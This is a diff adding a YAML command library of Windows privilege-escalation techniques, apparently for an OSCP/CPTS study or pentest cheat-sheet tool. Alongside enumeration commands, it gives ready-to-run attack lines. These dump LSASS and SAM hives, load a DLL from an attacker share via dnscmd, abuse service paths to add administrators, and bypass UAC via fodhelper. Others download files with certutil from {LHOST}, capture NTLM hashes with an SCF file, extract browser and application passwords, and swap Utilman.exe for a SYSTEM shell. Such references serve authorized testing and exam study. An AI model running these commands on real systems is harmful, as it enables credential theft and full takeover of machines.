@@ -1,0 +1,238 @@
+category: "privesc-windows"
+description: "Windows privilege escalation techniques"
+commands:
+  - name: "winpeas"
+    description: "Run WinPEAS enumeration"
+    command: ".\\winPEASx64.exe"
+    tool: "winpeas"
+    tags: ["privesc", "windows", "enum", "auto"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+    notes: "Transfer to target first"
+
+  - name: "whoami-all"
+    description: "Full user context and privileges"
+    command: "whoami /all"
+    tool: "windows"
+    tags: ["privesc", "windows", "enum"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+
+  - name: "systeminfo"
+    description: "System information and patch level"
+    command: "systeminfo"
+    tool: "windows"
+    tags: ["privesc", "windows", "enum", "patches"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+
+  - name: "unquoted-service-paths"
+    description: "Find unquoted service paths"
+    command: "wmic service get name,displayname,pathname,startmode | findstr /i auto | findstr /i /v \"C:\\Windows\\\\\""
+    tool: "wmic"
+    tags: ["privesc", "windows", "services", "unquoted"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+
+  - name: "service-permissions"
+    description: "Check service permissions with accesschk"
+    command: "accesschk.exe /accepteula -uwcqv \"Authenticated Users\" * | findstr SERVICE"
+    tool: "accesschk"
+    tags: ["privesc", "windows", "services", "permissions"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+
+  - name: "scheduled-tasks"
+    description: "Enumerate scheduled tasks"
+    command: "schtasks /query /fo LIST /v | findstr /i \"Task To Run\\|Run As User\\|Schedule Type\""
+    tool: "windows"
+    tags: ["privesc", "windows", "tasks"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+
+  - name: "always-install-elevated"
+    description: "Check AlwaysInstallElevated registry"
+    command: "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated & reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"
+    tool: "reg"
+    tags: ["privesc", "windows", "registry", "msi"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+
+  - name: "stored-credentials"
+    description: "Check for stored credentials"
+    command: "cmdkey /list"
+    tool: "windows"
+    tags: ["privesc", "windows", "credentials"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+    notes: "If creds found: runas /savecred /user:DOMAIN\\USER cmd.exe"
+
+  - name: "autologon-creds"
+    description: "Check for auto-logon credentials in registry"
+    command: "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" 2>nul | findstr /i \"DefaultUserName DefaultPassword\""
+    tool: "reg"
+    tags: ["privesc", "windows", "credentials", "autologon"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+
+  - name: "seimpersonate-potato"
+    description: "SeImpersonatePrivilege exploitation with PrintSpoofer"
+    command: ".\\PrintSpoofer64.exe -c \"cmd /c whoami\""
+    tool: "printspoofer"
+    tags: ["privesc", "windows", "impersonate", "potato"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+    notes: "Use when whoami /priv shows SeImpersonatePrivilege. Alt: GodPotato, JuicyPotato"
+
+  - name: "internal-ports"
+    description: "Check internal listening ports"
+    command: "netstat -ano | findstr LISTENING"
+    tool: "windows"
+    tags: ["privesc", "windows", "ports", "internal"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+
+  - name: "powershell-history"
+    description: "Check PowerShell command history"
+    command: "type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"
+    tool: "windows"
+    tags: ["privesc", "windows", "history", "credentials"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+
+  - name: "lolbas-certutil"
+    description: "Download file with certutil (LOLBAS)"
+    command: "certutil -urlcache -split -f http://{LHOST}/file.exe file.exe"
+    tool: "certutil"
+    tags: ["transfer", "windows", "lolbas", "download"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+    references: ["https://lolbas-project.github.io/"]
+
+  # ── New entries ──
+
+  - name: "sedebug-lsass"
+    description: "Dump LSASS with SeDebugPrivilege for credential extraction"
+    command: "procdump.exe -ma lsass.exe lsass.dmp"
+    tool: "procdump"
+    tags: ["privesc", "windows", "credentials", "lsass", "sedebug"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+    notes: "Requires SeDebugPrivilege. Then: mimikatz sekurlsa::minidump lsass.dmp. Alt: comsvcs.dll MiniDump"
+
+  - name: "sebackup-sam"
+    description: "Extract SAM/SYSTEM hives with SeBackupPrivilege"
+    command: "reg save HKLM\\SAM sam.bak & reg save HKLM\\SYSTEM system.bak"
+    tool: "reg"
+    tags: ["privesc", "windows", "backup", "sam", "sebackup"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+    notes: "Then: secretsdump.py -sam sam.bak -system system.bak LOCAL. For DC: shadow copy NTDS.dit"
+
+  - name: "dnsadmin-dll"
+    description: "DnsAdmins group — load malicious DLL into DNS service"
+    command: "dnscmd /config /serverlevelplugindll \\\\attacker\\share\\evil.dll"
+    tool: "dnscmd"
+    tags: ["privesc", "windows", "dnsadmin", "groups"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+    notes: "Then: sc stop dns && sc start dns. DLL runs as SYSTEM. Must be in DnsAdmins group"
+
+  - name: "server-operators"
+    description: "Server Operators group — modify service binary path"
+    command: "sc config <svc> binPath= \"cmd /c net localgroup administrators <user> /add\""
+    tool: "sc"
+    tags: ["privesc", "windows", "serveroperators", "groups"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+    notes: "Then: sc stop <svc> && sc start <svc>. Server Operators can modify services"
+
+  - name: "uac-bypass-fodhelper"
+    description: "UAC bypass using fodhelper.exe"
+    command: "REG ADD HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /d cmd.exe /f && REG ADD HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v DelegateExecute /t REG_SZ /f && fodhelper.exe"
+    tool: "reg"
+    tags: ["privesc", "windows", "uac", "bypass"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+    notes: "Works when UAC is not set to Always Notify. Alt: eventvwr.exe, DiskCleanup, UACME"
+
+  - name: "weak-acl-check"
+    description: "Find files/folders with weak ACLs"
+    command: "icacls \"C:\\Program Files\\*\" /T /C 2>nul | findstr /i \"(F) (M) (W)\""
+    tool: "icacls"
+    tags: ["privesc", "windows", "acl", "permissions"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+    notes: "Look for Everyone, Authenticated Users, BUILTIN\\Users with Full/Modify/Write on service binaries"
+
+  - name: "sharpup-audit"
+    description: "Run SharpUp for comprehensive privesc audit"
+    command: "SharpUp.exe audit"
+    tool: "sharpup"
+    tags: ["privesc", "windows", "enum", "sharpup"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+    notes: "Checks modifiable services, unquoted paths, writable hijack dirs, token privs, etc."
+
+  - name: "kernel-wes"
+    description: "Windows Exploit Suggester based on systeminfo"
+    command: "wes.py systeminfo.txt -i 'Elevation of Privilege'"
+    tool: "wes"
+    tags: ["privesc", "windows", "kernel", "wes", "exploit"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+    notes: "Run 'systeminfo > systeminfo.txt' first. Transfer to attacker for wes.py. Alt: Watson.exe on target"
+
+  - name: "snaffler"
+    description: "Snaffler — find sensitive files across shares and drives"
+    command: "Snaffler.exe -s -o snaffler.log"
+    tool: "snaffler"
+    tags: ["privesc", "windows", "pillage", "credentials"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+    notes: "Searches for passwords, keys, configs in files. Great for post-compromise pillaging"
+
+  - name: "sharpchrome-creds"
+    description: "Extract Chrome saved credentials"
+    command: "SharpChrome.exe logins"
+    tool: "sharpchrome"
+    tags: ["privesc", "windows", "browser", "chrome", "credentials"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+    notes: "Also: SharpChrome.exe cookies. Extracts from current user's Chrome profile"
+
+  - name: "lazagne-all"
+    description: "Extract all application credentials with LaZagne"
+    command: "LaZagne.exe all"
+    tool: "lazagne"
+    tags: ["privesc", "windows", "credentials", "lazagne"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+    notes: "Extracts passwords from browsers, mail, WiFi, databases, sysadmin tools, etc."
+
+  - name: "scf-file-attack"
+    description: "SCF file attack to capture NTLMv2 hashes"
+    command: "echo [Shell] > file.scf && echo IconFile=\\\\<attacker>\\share\\icon >> file.scf"
+    tool: "windows"
+    tags: ["privesc", "windows", "interaction", "ntlm", "scf"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+    notes: "Place in writable share. Capture NTLMv2 with Responder/Inveigh when user browses folder"
+
+  - name: "event-log-reader"
+    description: "Search event logs for credentials (Event Log Readers group)"
+    command: "wevtutil qe Security /f:text | findstr /i password"
+    tool: "wevtutil"
+    tags: ["privesc", "windows", "eventlog", "credentials", "groups"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+    notes: "Requires Event Log Readers group. Also try: Get-WinEvent -FilterHashtable @{LogName='Security'}"
+
+  - name: "setakeownership"
+    description: "Take ownership of protected files with SeTakeOwnershipPrivilege"
+    command: "takeown /f C:\\Windows\\System32\\Utilman.exe && icacls C:\\Windows\\System32\\Utilman.exe /grant <user>:F"
+    tool: "takeown"
+    tags: ["privesc", "windows", "takeownership", "privileges"]
+    os: "windows"
+    exam: ["oscp", "cpts"]
+    notes: "Replace Utilman.exe with cmd.exe. Lock screen → Ease of Access → SYSTEM shell"
